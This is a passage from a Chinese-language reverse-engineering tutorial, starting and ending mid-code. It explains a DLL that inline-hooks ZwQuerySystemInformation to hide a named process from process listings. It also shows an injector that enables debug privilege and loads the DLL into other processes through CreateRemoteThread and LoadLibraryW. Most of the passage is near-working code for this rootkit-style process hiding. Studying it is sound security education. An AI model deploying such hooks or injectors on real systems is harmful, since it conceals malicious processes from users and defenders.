        memcpy(prOrg, Buf, 5); //挂钩操作
        VirtualProtect((LPVOID)prOrg, 5, dwOldProtect, &dwOldProtect); //复原原始内存区域的安全权限
        return TRUE;
    }
    BOOL unhook_code(LPCTSTR szDllName, LPCSTR szFuncName, PBYTE pOrgbyte) //脱钩函数
    {
        FARPROC pFunc = NULL;
        DWORD dwOldProtect = 0;
        PBYTE pByte = NULL;
        pFunc = (FARPROC)GetProcAddress(GetModuleHandle(szDllName), szFuncName); //获取 所需要钩取的API函数的原始地址
        pByte = (PBYTE)pFunc;
        if (pByte[0] != 0xE9) //判断是否已经处于脱钩状态
            return FALSE;
        VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
        memcpy(pByte, pOrgbyte, 5); //脱钩操作
        VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);
        return TRUE;
    }
    NTSTATUS WINAPI NewZwQuerySystemInformation(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID                    SystemInformation,
        ULONG                    SystemInformationLength,
        PULONG                   ReturnLength)
    {
        NTSTATUS status;
        FARPROC pFunc;
        PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
        unhook_code(DLLNAME, FUNCNAME, g_OrgBytes); //先进行脱钩
        pFunc = GetProcAddress(GetModuleHandle(DLLNAME), FUNCNAME); //获取原始API的地址
        //再次调用这个原始的API函数以获取进程信息
        status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
        if (status != STATUS_SUCCESS) //当API函数执行不成功时跳转至结束处理
        {
            goto __NTQUERYSYSTEMINFORMATION_END;
        }
        if (SystemInformationClass == SystemProcessInformation) //只关注SystemProcessInformation这一个类型的操作
        {
            //进行SystemProcessInformation的类型转换，现在pCur则是一个指向存储运行中所有进程结构体链表的链表头
            pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation; 
            pPrev = NULL;
            while (TRUE)
            {
                //循环比较找到需要隐藏的目标程序的结构体
                if (pCur->Reserved2[1] != NULL)
                {
                    if (!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))
                    {
                        //当找到目标进程时有两种情况：1.下一个节点为0，也就是链表结束  2.下一个节点不为0
                        if (pCur->NextEntryOffset == 0)
                            pPrev->NextEntryOffset = 0; //直接把上一个节点的下一个成员值置为0
                        else
                            pPrev->NextEntryOffset += pCur->NextEntryOffset; //将上一个节点指向下一个节点的偏移加上当前节点指向下一个节点的偏移
                    }
                    else
                        pPrev = pCur; //没有匹配到则向下推进
                }
                if (pCur->NextEntryOffset == 0) //遍历到结尾则退出
                    break;
                pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset); //将当前的pCur移动至下一个节点
            }
        }
    __NTQUERYSYSTEMINFORMATION_END:
        // 函数终止前，再次执行API钩取操作，为下次调用准备
        hook_code(DLLNAME, FUNCNAME, (PROC)NewZwQuerySystemInformation, g_OrgBytes);
        return status;
    }
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        char szCurentProcName[MAX_PATH] = { 0,};
        char* p = NULL;
        GetModuleFileNameA(NULL, szCurentProcName, MAX_PATH);
        //1.异常处理：如果当前进程名字为HideProc.exe（即注入程序），则终止，不进行钩取。
        p = strrchr(szCurentProcName, '\\'); //获得当前进程的应用程序名
        if (p != NULL && !_stricmp(p + 1, "HideProc.exe"))
            return TRUE;
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH: //进行API钩取
            hook_code(DLLNAME, FUNCNAME, (PROC)NewZwQuerySystemInformation, g_OrgBytes);
            break;
        case DLL_PROCESS_DETACH: //将API进行脱钩，恢复其原始形态
            unhook_code(DLLNAME, FUNCNAME, g_OrgBytes);
            break;
        }
        return TRUE;
    }
    #ifdef __cplusplus //导出函数，即在HideProc.exe中使用到的用于设置g_szProcName的SetProcName函数
    extern "C" {
    #endif
        __declspec(dllexport) void SetProcName(LPCTSTR szProcName) //设置导出函数SetProcName，给共享全局变量赋值
        {
            _tcscpy_s(g_szProcName, szProcName);
        }
    #ifdef __cplusplus
    }
    #endif
程序的逻辑大概如下：
  1. 挂钩函数（hook_code）
  2. 脱钩函数（unhook_code）
  3. 钩取后重定义的目标API函数（NewZwQuerySystemInformation）
  4. 进行挂钩和脱钩的主函数（DllMain）
下面将对这些函数中比较重要的部分进行解析
## hook_code（unhook_code）：
挂钩与脱钩函数的逻辑和操作比较简单，没有需要特别注意的地方，主要是关于API修改的内容。
由于是要将原始API函数起始的5个字节修改为相应的跳转指令，而无条件跳转指令JMP的机器指令对应的是0xE9，所以在函数中的这个部分：
    byte Buf[5] = { 0xE9,0, };
就是对应的跳转指令开始的部分。
还有就是有关具体跳转地址的计算（也就是对应dwAddress）的计算：
    跳转地址 = 目标跳转地址 - 当前位置地址 - 指令长度（5字节）
这里可能会有一个问题就是为什么这里的JMP跳转的地址不是直接设置为目标跳转地址呢？
这是由于程序内的跳转是依据当前地址的相对地址进行跳转，而不是直接设置绝对地址进行跳转。
## NewZwQuerySystemInformation：
源码中比较重要的部分就是关于ZwQuerySystemInformation被钩取后执行的自定义函数，也就是NewZwQuerySystemInformation，原始的API函数结构大概如下：
    NTSTATUS WINAPI ZwQuerySystemInformation(
      _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
      _Inout_   PVOID                    SystemInformation,
      _In_      ULONG                    SystemInformationLength,
      _Out_opt_ PULONG                   ReturnLength
    );
这个函数需要调用的四个参数中有两个是自定义的结构体：
  * SystemInformationClass
  * SystemInformation
分别对应：
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemBasicInformation = 0,
        SystemPerformanceInformation = 2,
        SystemTimeOfDayInformation = 3,
        SystemProcessInformation = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemInterruptInformation = 23,
        SystemExceptionInformation = 33,
        SystemRegistryQuotaInformation = 37,
        SystemLookasideInformation = 45
    } SYSTEM_INFORMATION_CLASS;
以及：
    typedef struct _SYSTEM_PROCESS_INFORMATION {
        ULONG NextEntryOffset;
        ULONG NumberOfThreads;
        BYTE Reserved1[48];
        PVOID Reserved2[3];
        HANDLE UniqueProcessId;
        PVOID Reserved3;
        ULONG HandleCount;
        BYTE Reserved4[4];
        PVOID Reserved5[11];
        SIZE_T PeakPagefileUsage;
        SIZE_T PrivatePageCount;
        LARGE_INTEGER Reserved6[6];
    } SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
第一个枚举类型的结构体会根据API的执行结果得到SystemInformation的数据类型，比如在本次操作中所需要的数据类型就是SystemProcessInformation，对应的数值为5。
而第二个数据结构就是储存有关于系统中每个进程的信息，在API函数执行后就可以通过遍历这个数据结构构成的单向链表来找到对应目标进程的进程信息。
## 共享节区：
在程序还会发现有这样一段代码：
    #pragma comment(linker,"/SECTION:.SHARE,RWS")
    #pragma data_seg(".SHARE")
        TCHAR g_szProcName[MAX_PATH] = { 0, };
    #pragma data_seg()
这是通过设置共享节区的方式与其他程序进行数据的共享。
总所周知，每个程序运行的内存空间在逻辑上是相互隔离的，以保证每个程序数据的独立以及安全。但是如果要在其他程序中调用本程序的数据（比如本次操作中需要将命令行内获得的需要隐藏的目标进程名共享给注入的DLL），可以通过在程序中设置一个共享上的数据节区来完成这个功能。具体写法参考本源码中的这一部分。
# HideProc2.exe：
下面进行的注入和卸载操作进行了一定优化，使用一个另一个版本的注入代码，其源码大概如下：
    #include "windows.h"
    #include "stdio.h"
    #include "tlhelp32.h"
    #include "tchar.h"
    enum Mode //定义一个枚举类型，分为注入和卸载两种情况
    {
        INJECT_MODE = 0, EJECT_MODE
    };
    BOOL EnableDebugPriv() //提权函数
    {
        HANDLE hToken;
        LUID Luid;
        TOKEN_PRIVILEGES tkp;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        {
            printf("OpenProcessToken failed!\n");
            return FALSE;
        }
        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid))
        {
            CloseHandle(hToken);
            printf("LookupPrivilegeValue failed!\n");
            return FALSE;
        }
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Luid = Luid;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL))
        {
            printf("AdjustTokenPrivileges failed!");
            CloseHandle(hToken);
        }
        else
        {
            printf("privilege get!\n");
            return TRUE;
        }
    }
    BOOL inject(DWORD dwPID, LPCTSTR szDllPath) //注入函数
    {
        HANDLE hProcess = NULL;
        HANDLE hThread = NULL;
        LPVOID lpRemoteBuf = NULL;
        DWORD BufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
        LPTHREAD_START_ROUTINE pThreadProc;
        DWORD dwError = 0;
        if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
        {
            dwError = GetLastError();
            printf("OpenProcess failed!\n");
            return FALSE;
        }
        lpRemoteBuf = VirtualAllocEx(hProcess, NULL, BufSize, MEM_COMMIT, PAGE_READWRITE); //为远程线程参数分配内存
        WriteProcessMemory(hProcess, lpRemoteBuf, (LPVOID)szDllPath, BufSize, NULL); //写入参数（即DLL路径）
        pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
        hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, lpRemoteBuf, 0, NULL); //创建远程线程
        if (!hThread)
        {
            printf("CreateRemoteThread failed!\n");
            CloseHandle(hProcess);
            return FALSE;
        }
        WaitForSingleObject(hThread, INFINITE);
        VirtualFreeEx(hProcess, lpRemoteBuf, 0, MEM_RELEASE); //释放掉相应空间
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return TRUE;
    }
    BOOL Eject(DWORD dwPID, LPCTSTR szDllPath) //卸载DLL函数
    {
        HANDLE hSnapshot = NULL;
        HANDLE hProcess = NULL;
        HANDLE hThread = NULL;
        BOOL bMore = FALSE;
        BOOL bFound = FALSE;
        LPTHREAD_START_ROUTINE pThreadProc;
        MODULEENTRY32 me = { sizeof(MODULEENTRY32) };
        if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
        {
            printf("OpenProcess failed!\n");
            return FALSE;
        }
        if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)) == INVALID_HANDLE_VALUE)
        {
            printf("CreateToolhelp32Snapshot failed!\n");
            CloseHandle(hProcess);
            return FALSE;
        }
        bMore = Module32First(hSnapshot, &me);
        for (; bMore; bMore = Module32Next(hSnapshot, &me)) //遍历目标进程模块列表找到目标进程中是否载入了该DLL
        {
            if (!_tcsicmp(me.szModule, szDllPath) || !_tcsicmp(me.szExePath, szDllPath))
            {
                bFound = TRUE;
                break;
            }